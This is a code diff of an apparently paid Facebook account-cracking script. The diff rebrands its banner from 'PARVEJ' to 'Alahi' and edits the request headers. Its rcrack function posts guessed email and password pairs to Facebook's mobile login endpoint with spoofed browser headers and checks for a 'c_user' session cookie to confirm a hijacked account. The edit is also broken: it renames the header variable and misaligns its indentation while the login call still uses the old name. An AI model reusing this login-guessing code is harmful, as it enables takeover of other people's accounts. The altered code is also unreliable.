@@ -145,7 +145,7 @@ logo = ("""
 ██   ██ ███████ ██   ██ ██   ██ ██ 
                                                                                                         
                                    
- \033[1;91m\033[1;41m\033[1;97m              WELCOME TO PARVEJ TOOLS               \033[;0m\033[1;91m\033[1;92m           
+ \033[1;91m\033[1;41m\033[1;97m              WELCOME TO Alahi TOOLS               \033[;0m\033[1;91m\033[1;92m           
 
 \033[1;92m══════════════════════════════════════════
 \033[1;32m[-] TOOLS TYPE:\033[1;32m PAID
@@ -154,7 +154,7 @@ logo = ("""
 \033[1;32m[-] FACEBOOK  :\033[1;32m FA ALAHI
 \033[1;92m══════════════════════════════════════════
 
-\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS PARVEJ BRAND\033[;0m\033[1;91m═══>\033[1;92m""")
+\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS Alahi BRAND\033[;0m\033[1;91m═══>\033[1;92m""")
 
 try:
     print('\n\n\033[38;5;46mCRACKING UPDATE DONE\033[38;5;46m')
@@ -239,7 +239,7 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'x.facebook.com',
+      headers = { 'authority': 'x.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
@@ -257,7 +257,7 @@ def rcrack(uid,pwx,tl):
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-    'viewport-width': pro}
+    'viewport-width': '980',}
             lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
@@ -281,6 +281,6 @@ def rcrack(uid,pwx,tl):
         sys.stdout.flush()
     except:
         pass
-PARVEJ_programmer()
+ALAHI_programmer()
 
 
